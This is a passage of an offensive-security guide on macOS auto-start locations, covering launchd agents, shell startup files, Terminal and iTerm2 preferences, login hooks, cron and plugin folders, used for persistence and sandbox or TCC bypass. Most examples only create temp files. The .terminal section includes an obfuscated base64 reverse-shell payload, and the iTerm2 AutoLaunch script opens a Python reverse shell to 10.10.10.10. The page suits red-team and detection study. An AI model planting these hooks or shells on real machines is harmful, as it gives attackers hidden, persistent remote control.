<li><strong>Trigger</strong>: Reboot</li>
<li>Root required</li>
</ul>
</li>
<li><strong><code>/Library/LaunchDaemons</code></strong>
<ul>
<li><strong>Trigger</strong>: Reboot</li>
<li>Root required</li>
</ul>
</li>
<li><strong><code>/System/Library/LaunchAgents</code></strong>
<ul>
<li><strong>Trigger</strong>: Reboot</li>
<li>Root required</li>
</ul>
</li>
<li><strong><code>/System/Library/LaunchDaemons</code></strong>
<ul>
<li><strong>Trigger</strong>: Reboot</li>
<li>Root required</li>
</ul>
</li>
<li><strong><code>~/Library/LaunchAgents</code></strong>
<ul>
<li><strong>Trigger</strong>: Relog-in</li>
</ul>
</li>
<li><strong><code>~/Library/LaunchDemons</code></strong>
<ul>
<li><strong>Trigger</strong>: Relog-in</li>
</ul>
</li>
</ul>
<div class='notice notice-success'><b>SUCCESS</b><br/>
As interesting fact, **`launchd`** has an embedded property list in a the Mach-o section `__Text.__config` which contains other well known services launchd must start. Moreover, these services can contain the `RequireSuccess`, `RequireRun` and `RebootOnSuccess` that means that they must be run and complete successfully.
<p>Ofc, It cannot be modified because of code signing.</p>
</div>
<h4 id="description--exploitation"><a class="header" href="#description--exploitation">Description &amp; Exploitation</a></h4>
<p><strong><code>launchd</code></strong> is the <strong>first</strong> <strong>process</strong> executed by OX S kernel at startup and the last one to finish at shut down. It should always have the <strong>PID 1</strong>. This process will <strong>read and execute</strong> the configurations indicated in the <strong>ASEP</strong> <strong>plists</strong> in:</p>
<ul>
<li><code>/Library/LaunchAgents</code>: Per-user agents installed by the admin</li>
<li><code>/Library/LaunchDaemons</code>: System-wide daemons installed by the admin</li>
<li><code>/System/Library/LaunchAgents</code>: Per-user agents provided by Apple.</li>
<li><code>/System/Library/LaunchDaemons</code>: System-wide daemons provided by Apple.</li>
</ul>
<p>When a user logs in the plists located in <code>/Users/$USER/Library/LaunchAgents</code> and <code>/Users/$USER/Library/LaunchDemons</code> are started with the <strong>logged users permissions</strong>.</p>
<p>The <strong>main difference between agents and daemons is that agents are loaded when the user logs in and the daemons are loaded at system startup</strong> (as there are services like ssh that needs to be executed before any user access the system). Also agents may use GUI while daemons need to run in the background.</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;key&gt;Label&lt;/key&gt;
        &lt;string&gt;com.apple.someidentifier&lt;/string&gt;
    &lt;key&gt;ProgramArguments&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;bash -c 'touch /tmp/launched'&lt;/string&gt; &lt;!--Prog to execute--&gt;
    &lt;/array&gt;
    &lt;key&gt;RunAtLoad&lt;/key&gt;&lt;true/&gt; &lt;!--Execute at system startup--&gt;
    &lt;key&gt;StartInterval&lt;/key&gt;
    &lt;integer&gt;800&lt;/integer&gt; &lt;!--Execute each 800s--&gt;
    &lt;key&gt;KeepAlive&lt;/key&gt;
    &lt;dict&gt;
        &lt;key&gt;SuccessfulExit&lt;/key&gt;&lt;/false&gt; &lt;!--Re-execute if exit unsuccessful--&gt;
        &lt;!--If previous is true, then re-execute in successful exit--&gt;
    &lt;/dict&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>There are cases where an <strong>agent needs to be executed before the user logins</strong>, these are called <strong>PreLoginAgents</strong>. For example, this is useful to provide assistive technology at login. They can be found also in <code>/Library/LaunchAgents</code>(see <a href="https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents"><strong>here</strong></a> an example).</p>
<div class='notice notice-info'><b>INFO</b><br/>
New Daemons or Agents config files will be **loaded after next reboot or using** `launchctl load <target.plist>` It's **also possible to load .plist files without that extension** with `launchctl -F <file>` (however those plist files won't be automatically loaded after reboot).\
It's also possible to **unload** with `launchctl unload <target.plist>` (the process pointed by it will be terminated),
<p>To <strong>ensure</strong> that there isn't <strong>anything</strong> (like an override) <strong>preventing</strong> an <strong>Agent</strong> or <strong>Daemon</strong> <strong>from</strong> <strong>running</strong> run: <code>sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist</code></p>
</div>
<p>List all the agents and daemons loaded by the current user:</p>
<pre><code class="language-bash">launchctl list
</code></pre>
<div class='notice notice-warning'><b>WARNING</b><br/>
If a plist is owned by a user, even if it's in a daemon system wide folders, the **task will be executed as the user** and not as root. This can prevent some privilege escalation attacks.
</div>
<h4 id="more-info-about-launchd"><a class="header" href="#more-info-about-launchd">More info about launchd</a></h4>
<p><strong><code>launchd</code></strong> is the <strong>first</strong> user mode process which is started from the <strong>kernel</strong>. The process start must be <strong>successful</strong> and it <strong>cannot exit or crash</strong>. It's even <strong>protected</strong> against some <strong>killing signals</strong>.</p>
<p>One of the first things <code>launchd</code> would do is to <strong>start</strong> all the <strong>daemons</strong> like:</p>
<ul>
<li><strong>Timer daemons</strong> based on time to be executed:
<ul>
<li>atd (<code>com.apple.atrun.plist</code>): Has a <code>StartInterval</code> of 30min</li>
<li>crond (<code>com.apple.systemstats.daily.plist</code>): Has <code>StartCalendarInterval</code> to start at 00:15</li>
</ul>
</li>
<li><strong>Network daemons</strong> like:
<ul>
<li><code>org.cups.cups-lpd</code>: Listens in TCP (<code>SockType: stream</code>) with <code>SockServiceName: printer</code>
<ul>
<li>SockServiceName must be either a port or a service from <code>/etc/services</code></li>
</ul>
</li>
<li><code>com.apple.xscertd.plist</code>: Listens on TCP in port 1640</li>
</ul>
</li>
<li><strong>Path daemons</strong> that are executed when a specified path changes:
<ul>
<li><code>com.apple.postfix.master</code>: Checking the path <code>/etc/postfix/aliases</code></li>
</ul>
</li>
<li><strong>IOKit notifications daemons</strong>:
<ul>
<li><code>com.apple.xartstorageremoted</code>: <code>"com.apple.iokit.matching" =&gt; { "com.apple.device-attach" =&gt; { "IOMatchLaunchStream" =&gt; 1 ...</code></li>
</ul>
</li>
<li><strong>Mach port:</strong>
<ul>
<li><code>com.apple.xscertd-helper.plist</code>: It's indicating in the <code>MachServices</code> entry the name <code>com.apple.xscertd.helper</code></li>
</ul>
</li>
<li><strong>UserEventAgent:</strong>
<ul>
<li>This is different from the previous one. It makes launchd spawn apps in response to specific event. However, in this case, the main binary involved isn't <code>launchd</code> but <code>/usr/libexec/UserEventAgent</code>. It loads plugins from the SIP restricted folder /System/Library/UserEventPlugins/ where each plugin indicates its initialiser in the <code>XPCEventModuleInitializer</code> key or. in the case of older plugins, in the <code>CFPluginFactories</code> dict under the key <code>FB86416D-6164-2070-726F-70735C216EC0</code> of its <code>Info.plist</code>.</li>
</ul>
</li>
</ul>
<h3 id="shell-startup-files"><a class="header" href="#shell-startup-files">shell startup files</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0001/">https://theevilbit.github.io/beyond/beyond_0001/</a><br />
Writeup (xterm): <a href="https://theevilbit.github.io/beyond/beyond_0018/">https://theevilbit.github.io/beyond/beyond_0018/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC Bypass: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>But you need to find an app with a TCC bypass that executes a shell that loads these files</li>
</ul>
</li>
</ul>
<h4 id="locations-1"><a class="header" href="#locations-1">Locations</a></h4>
<ul>
<li><strong><code>~/.zshrc</code>, <code>~/.zlogin</code>, <code>~/.zshenv.zwc</code></strong>, <strong><code>~/.zshenv</code>, <code>~/.zprofile</code></strong>
<ul>
<li><strong>Trigger</strong>: Open a terminal with zsh</li>
</ul>
</li>
<li><strong><code>/etc/zshenv</code>, <code>/etc/zprofile</code>, <code>/etc/zshrc</code>, <code>/etc/zlogin</code></strong>
<ul>
<li><strong>Trigger</strong>: Open a terminal with zsh</li>
<li>Root required</li>
</ul>
</li>
<li><strong><code>~/.zlogout</code></strong>
<ul>
<li><strong>Trigger</strong>: Exit a terminal with zsh</li>
</ul>
</li>
<li><strong><code>/etc/zlogout</code></strong>
<ul>
<li><strong>Trigger</strong>: Exit a terminal with zsh</li>
<li>Root required</li>
</ul>
</li>
<li>Potentially more in: <strong><code>man zsh</code></strong></li>
<li><strong><code>~/.bashrc</code></strong>
<ul>
<li><strong>Trigger</strong>: Open a terminal with bash</li>
</ul>
</li>
<li><code>/etc/profile</code> (didn't work)</li>
<li><code>~/.profile</code> (didn't work)</li>
<li><code>~/.xinitrc</code>, <code>~/.xserverrc</code>, <code>/opt/X11/etc/X11/xinit/xinitrc.d/</code>
<ul>
<li><strong>Trigger</strong>: Expected to trigger with xterm, but it <strong>isn't installed</strong> and even after installed this error is thrown: xterm: <code>DISPLAY is not set</code></li>
</ul>
</li>
</ul>
<h4 id="description--exploitation-1"><a class="header" href="#description--exploitation-1">Description &amp; Exploitation</a></h4>
<p>When initiating a shell environment such as <code>zsh</code> or <code>bash</code>, <strong>certain startup files are run</strong>. macOS currently uses <code>/bin/zsh</code> as the default shell. This shell is automatically accessed when the Terminal application is launched or when a device is accessed via SSH. While <code>bash</code> and <code>sh</code> are also present in macOS, they need to be explicitly invoked to be used.</p>
<p>The man page of zsh, which we can read with <strong><code>man zsh</code></strong> has a long description of the startup files.</p>
<pre><code class="language-bash"># Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" &gt;&gt; ~/.zshrc
</code></pre>
<h3 id="re-opened-applications"><a class="header" href="#re-opened-applications">Re-opened Applications</a></h3>
<div class='notice notice-danger'><b>DANGER</b><br/>
Configuring the indicated exploitation and loging-out and loging-in or even rebooting didn't work for me to execute the app. (The app wasn't being executed, maybe it needs to be running when these actions are performed)
</div>
<p><strong>Writeup</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0021/">https://theevilbit.github.io/beyond/beyond_0021/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC bypass: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="location"><a class="header" href="#location">Location</a></h4>
<ul>
<li><strong><code>~/Library/Preferences/ByHost/com.apple.loginwindow.&lt;UUID&gt;.plist</code></strong>
<ul>
<li><strong>Trigger</strong>: Restart reopening applications</li>
</ul>
</li>
</ul>
<h4 id="description--exploitation-2"><a class="header" href="#description--exploitation-2">Description &amp; Exploitation</a></h4>
<p>All the applications to reopen are inside the plist <code>~/Library/Preferences/ByHost/com.apple.loginwindow.&lt;UUID&gt;.plist</code></p>
<p>So, make the reopen applications launch your own one, you just need to <strong>add your app to the list</strong>.</p>
<p>The UUID can be found listing that directory or with <code>ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'</code></p>
<p>To check the applications that will be reopened you can do:</p>
<pre><code class="language-bash">defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.&lt;UUID&gt;.plist
</code></pre>
<p>To <strong>add an application to this list</strong> you can use:</p>
<pre><code class="language-bash"># Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.&lt;UUID&gt;.plist
</code></pre>
<h3 id="terminal-preferences"><a class="header" href="#terminal-preferences">Terminal Preferences</a></h3>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC bypass: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>Terminal use to have FDA permissions of the user use it</li>
</ul>
</li>
</ul>
<h4 id="location-1"><a class="header" href="#location-1">Location</a></h4>
<ul>
<li><strong><code>~/Library/Preferences/com.apple.Terminal.plist</code></strong>
<ul>
<li><strong>Trigger</strong>: Open Terminal</li>
</ul>
</li>
</ul>
<h4 id="description--exploitation-3"><a class="header" href="#description--exploitation-3">Description &amp; Exploitation</a></h4>
<p>In <strong><code>~/Library/Preferences</code></strong> are store the preferences of the user in the Applications. Some of these preferences can hold a configuration to <strong>execute other applications/scripts</strong>.</p>
<p>For example, the Terminal can execute a command in the Startup:</p>
<figure><img src="../.gitbook/assets/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>
<p>This config is reflected in the file <strong><code>~/Library/Preferences/com.apple.Terminal.plist</code></strong> like this:</p>
<pre><code class="language-bash">[...]
"Window Settings" =&gt; {
    "Basic" =&gt; {
      "CommandString" =&gt; "touch /tmp/terminal_pwn"
      "Font" =&gt; {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" =&gt; 1
      "FontWidthSpacing" =&gt; 1.004032258064516
      "name" =&gt; "Basic"
      "ProfileCurrentVersion" =&gt; 2.07
      "RunCommandAsShell" =&gt; 0
      "type" =&gt; "Window Settings"
    }
[...]
</code></pre>
<p>So, if the plist of the preferences of the terminal in the system could be overwritten, the the <strong><code>open</code></strong> functionality can be used to <strong>open the terminal and that command will be executed</strong>.</p>
<p>You can add this from the cli with:</p>
<pre><code class="language-bash"># Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
</code></pre>
<h3 id="terminal-scripts--other-file-extensions"><a class="header" href="#terminal-scripts--other-file-extensions">Terminal Scripts / Other file extensions</a></h3>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC bypass: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>Terminal use to have FDA permissions of the user use it</li>
</ul>
</li>
</ul>
<h4 id="location-2"><a class="header" href="#location-2">Location</a></h4>
<ul>
<li><strong>Anywhere</strong>
<ul>
<li><strong>Trigger</strong>: Open Terminal</li>
</ul>
</li>
</ul>
<h4 id="description--exploitation-4"><a class="header" href="#description--exploitation-4">Description &amp; Exploitation</a></h4>
<p>If you create a <a href="https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx"><strong><code>.terminal</code></strong> script</a> and opens, the <strong>Terminal application</strong> will be automatically invoked to execute the commands indicated in there. If the Terminal app has some special privileges (such as TCC), your command will be run with those special privileges.</p>
<p>Try it with:</p>
<pre><code class="language-bash"># Prepare the payload
cat &gt; /tmp/test.terminal &lt;&lt; EOF
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
	&lt;key&gt;CommandString&lt;/key&gt;
	&lt;string&gt;mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;&lt;/string&gt;
	&lt;key&gt;ProfileCurrentVersion&lt;/key&gt;
	&lt;real&gt;2.0600000000000001&lt;/real&gt;
	&lt;key&gt;RunCommandAsShell&lt;/key&gt;
	&lt;false/&gt;
	&lt;key&gt;name&lt;/key&gt;
	&lt;string&gt;exploit&lt;/string&gt;
	&lt;key&gt;type&lt;/key&gt;
	&lt;string&gt;Window Settings&lt;/string&gt;
&lt;/dict&gt;
&lt;/plist&gt;
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
&lt;string&gt;echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;&lt;/string&gt;
</code></pre>
<p>You could also use the extensions <strong><code>.command</code></strong>, <strong><code>.tool</code></strong>, with regular shell scripts content and they will be also opened by Terminal.</p>
<div class='notice notice-danger'><b>DANGER</b><br/>
If terminal has **Full Disk Access** it will be able to complete that action (note that the command executed will be visible in a terminal window).
</div>
<h3 id="audio-plugins"><a class="header" href="#audio-plugins">Audio Plugins</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0013/">https://theevilbit.github.io/beyond/beyond_0013/</a><br />
Writeup: <a href="https://posts.specterops.io/audio-unit-plug-ins-896d3434a882">https://posts.specterops.io/audio-unit-plug-ins-896d3434a882</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC bypass: <a href="https://emojipedia.org/large-orange-circle">🟠</a>
<ul>
<li>You might get some extra TCC access</li>
</ul>
</li>
</ul>
<h4 id="location-3"><a class="header" href="#location-3">Location</a></h4>
<ul>
<li><strong><code>/Library/Audio/Plug-Ins/HAL</code></strong>
<ul>
<li>Root required</li>
<li><strong>Trigger</strong>: Restart coreaudiod or the computer</li>
</ul>
</li>
<li><strong><code>/Library/Audio/Plug-ins/Components</code></strong>
<ul>
<li>Root required</li>
<li><strong>Trigger</strong>: Restart coreaudiod or the computer</li>
</ul>
</li>
<li><strong><code>~/Library/Audio/Plug-ins/Components</code></strong>
<ul>
<li><strong>Trigger</strong>: Restart coreaudiod or the computer</li>
</ul>
</li>
<li><strong><code>/System/Library/Components</code></strong>
<ul>
<li>Root required</li>
<li><strong>Trigger</strong>: Restart coreaudiod or the computer</li>
</ul>
</li>
</ul>
<h4 id="description"><a class="header" href="#description">Description</a></h4>
<p>According to the previous writeups it's possible to <strong>compile some audio plugins</strong> and get them loaded.</p>
<h3 id="quicklook-plugins"><a class="header" href="#quicklook-plugins">QuickLook Plugins</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0028/">https://theevilbit.github.io/beyond/beyond_0028/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC bypass: <a href="https://emojipedia.org/large-orange-circle">🟠</a>
<ul>
<li>You might get some extra TCC access</li>
</ul>
</li>
</ul>
<h4 id="location-4"><a class="header" href="#location-4">Location</a></h4>
<ul>
<li><code>/System/Library/QuickLook</code></li>
<li><code>/Library/QuickLook</code></li>
<li><code>~/Library/QuickLook</code></li>
<li><code>/Applications/AppNameHere/Contents/Library/QuickLook/</code></li>
<li><code>~/Applications/AppNameHere/Contents/Library/QuickLook/</code></li>
</ul>
<h4 id="description--exploitation-5"><a class="header" href="#description--exploitation-5">Description &amp; Exploitation</a></h4>
<p>QuickLook plugins can be executed when you <strong>trigger the preview of a file</strong> (press space bar with the file selected in Finder) and a <strong>plugin supporting that file type</strong> is installed.</p>
<p>It's possible to compile your own QuickLook plugin, place it in one of the previous locations to load it and then go to a supported file and press space to trigger it.</p>
<h3 id="loginlogout-hooks"><a class="header" href="#loginlogout-hooks"><del>Login/Logout Hooks</del></a></h3>
<div class='notice notice-danger'><b>DANGER</b><br/>
This didn't work for me, neither with the user LoginHook nor with the root LogoutHook
</div>
<p><strong>Writeup</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0022/">https://theevilbit.github.io/beyond/beyond_0022/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC bypass: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="location-5"><a class="header" href="#location-5">Location</a></h4>
<ul>
<li>You need to be able to execute something like <code>defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh</code>
<ul>
<li><code>Lo</code>cated in <code>~/Library/Preferences/com.apple.loginwindow.plist</code></li>
</ul>
</li>
</ul>
<p>They are deprecated but can be used to execute commands when a user logs in.</p>
<pre><code class="language-bash">cat &gt; $HOME/hook.sh &lt;&lt; EOF
#!/bin/bash
echo 'My is: \`id\`' &gt; /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
</code></pre>
<p>This setting is stored in <code>/Users/$USER/Library/Preferences/com.apple.loginwindow.plist</code></p>
<pre><code class="language-bash">defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
</code></pre>
<p>To delete it:</p>
<pre><code class="language-bash">defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
</code></pre>
<p>The root user one is stored in <strong><code>/private/var/root/Library/Preferences/com.apple.loginwindow.plist</code></strong></p>
<h2 id="conditional-sandbox-bypass"><a class="header" href="#conditional-sandbox-bypass">Conditional Sandbox Bypass</a></h2>
<div class='notice notice-success'><b>SUCCESS</b><br/>
Here you can find start locations useful for **sandbox bypass** that allows you to simply execute something by **writing it into a file** and **expecting not super common conditions** like specific **programs installed, "uncommon" user** actions or environments.
</div>
<h3 id="cron"><a class="header" href="#cron">Cron</a></h3>
<p><strong>Writeup</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0004/">https://theevilbit.github.io/beyond/beyond_0004/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>However, you need to be able to execute <code>crontab</code> binary</li>
<li>Or be root</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="location-6"><a class="header" href="#location-6">Location</a></h4>
<ul>
<li><strong><code>/usr/lib/cron/tabs/</code>, <code>/private/var/at/tabs</code>, <code>/private/var/at/jobs</code>, <code>/etc/periodic/</code></strong>
<ul>
<li>Root required for direct write access. No root required if you can execute <code>crontab &lt;file&gt;</code></li>
<li><strong>Trigger</strong>: Depends on the cron job</li>
</ul>
</li>
</ul>
<h4 id="description--exploitation-6"><a class="header" href="#description--exploitation-6">Description &amp; Exploitation</a></h4>
<p>List the cron jobs of the <strong>current user</strong> with:</p>
<pre><code class="language-bash">crontab -l
</code></pre>
<p>You can also see all the cron jobs of the users in <strong><code>/usr/lib/cron/tabs/</code></strong> and <strong><code>/var/at/tabs/</code></strong> (needs root).</p>
<p>In MacOS several folders executing scripts with <strong>certain frequency</strong> can be found in:</p>
<pre><code class="language-bash"># The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
</code></pre>
<p>There you can find the regular <strong>cron</strong> <strong>jobs</strong>, the <strong>at</strong> <strong>jobs</strong> (not very used) and the <strong>periodic</strong> <strong>jobs</strong> (mainly used for cleaning temporary files). The daily periodic jobs can be executed for example with: <code>periodic daily</code>.</p>
<p>To add a <strong>user cronjob programatically</strong> it's possible to use:</p>
<pre><code class="language-bash">echo '* * * * * /bin/bash -c "touch /tmp/cron3"' &gt; /tmp/cron
crontab /tmp/cron
</code></pre>
<h3 id="iterm2"><a class="header" href="#iterm2">iTerm2</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0002/">https://theevilbit.github.io/beyond/beyond_0002/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC bypass: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>iTerm2 use to have granted TCC permissions</li>
</ul>
</li>
</ul>
<h4 id="locations-2"><a class="header" href="#locations-2">Locations</a></h4>
<ul>
<li><strong><code>~/Library/Application Support/iTerm2/Scripts/AutoLaunch</code></strong>
<ul>
<li><strong>Trigger</strong>: Open iTerm</li>
</ul>
</li>
<li><strong><code>~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt</code></strong>
<ul>
<li><strong>Trigger</strong>: Open iTerm</li>
</ul>
</li>
<li><strong><code>~/Library/Preferences/com.googlecode.iterm2.plist</code></strong>
<ul>
<li><strong>Trigger</strong>: Open iTerm</li>
</ul>
</li>
</ul>
<h4 id="description--exploitation-7"><a class="header" href="#description--exploitation-7">Description &amp; Exploitation</a></h4>
<p>Scripts stored in <strong><code>~/Library/Application Support/iTerm2/Scripts/AutoLaunch</code></strong> will be executed. For example:</p>
<pre><code class="language-bash">cat &gt; "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" &lt;&lt; EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
</code></pre>
<p>or:</p>
<pre><code class="language-bash">cat &gt; "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" &lt;&lt; EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
    async with iterm2.CustomControlSequenceMonitor(
            connection, "shared-secret", r'^create-window$') as mon:
        while True:
            match = await mon.async_get()
            await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
</code></pre>
<p>The script <strong><code>~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt</code></strong> will also be executed:</p>
<pre><code class="language-bash">do shell script "touch /tmp/iterm2-autolaunchscpt"
</code></pre>
<p>The iTerm2 preferences located in <strong><code>~/Library/Preferences/com.googlecode.iterm2.plist</code></strong> can <strong>indicate a command to execute</strong> when the iTerm2 terminal is opened.</p>
<p>This setting can be configured in the iTerm2 settings:</p>
<figure><img src="../.gitbook/assets/image (37).png" alt="" width="563"><figcaption></figcaption></figure>
<p>And the command is reflected in the preferences:</p>
<pre><code class="language-bash">plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" =&gt; [
    0 =&gt; {
      [...]
      "Initial Text" =&gt; "touch /tmp/iterm-start-command"
</code></pre>
<p>You can set the command to execute with:</p>
<pre><code class="language-bash"># Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
</code></pre>
<div class='notice notice-warning'><b>WARNING</b><br/>
Highly probable there are **other ways to abuse the iTerm2 preferences** to execute arbitrary commands.
</div>
<h3 id="xbar"><a class="header" href="#xbar">xbar</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0007/">https://theevilbit.github.io/beyond/beyond_0007/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>But xbar must be installed</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>It requests Accessibility permissions</li>
</ul>
</li>
</ul>
<h4 id="location-7"><a class="header" href="#location-7">Location</a></h4>
<ul>
<li><strong><code>~/Library/Application\ Support/xbar/plugins/</code></strong>
<ul>
<li><strong>Trigger</strong>: Once xbar is executed</li>
</ul>
</li>
</ul>
<h4 id="description-1"><a class="header" href="#description-1">Description</a></h4>
<p>If the popular program <a href="https://github.com/matryer/xbar"><strong>xbar</strong></a> is installed, it's possible to write a shell script in <strong><code>~/Library/Application\ Support/xbar/plugins/</code></strong> which will be executed when xbar is started:</p>
<pre><code class="language-bash">cat &gt; "$HOME/Library/Application Support/xbar/plugins/a.sh" &lt;&lt; EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
</code></pre>
<h3 id="hammerspoon"><a class="header" href="#hammerspoon">Hammerspoon</a></h3>
<p><strong>Writeup</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0008/">https://theevilbit.github.io/beyond/beyond_0008/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>But Hammerspoon must be installed</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>It requests Accessibility permissions</li>
</ul>
</li>
</ul>
<h4 id="location-8"><a class="header" href="#location-8">Location</a></h4>
<ul>
<li><strong><code>~/.hammerspoon/init.lua</code></strong>
<ul>
<li><strong>Trigger</strong>: Once hammerspoon is executed</li>
</ul>
</li>
</ul>
<h4 id="description-2"><a class="header" href="#description-2">Description</a></h4>
<p><a href="https://github.com/Hammerspoon/hammerspoon"><strong>Hammerspoon</strong></a> serves as an automation platform for <strong>macOS</strong>, leveraging the <strong>LUA scripting language</strong> for its operations. Notably, it supports the integration of complete AppleScript code and the execution of shell scripts, enhancing its scripting capabilities significantly.</p>
<p>The app looks for a single file, <code>~/.hammerspoon/init.lua</code>, and when started the script will be executed.</p>
<pre><code class="language-bash">mkdir -p "$HOME/.hammerspoon"
cat &gt; "$HOME/.hammerspoon/init.lua" &lt;&lt; EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
</code></pre>
<h3 id="bettertouchtool"><a class="header" href="#bettertouchtool">BetterTouchTool</a></h3>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a>
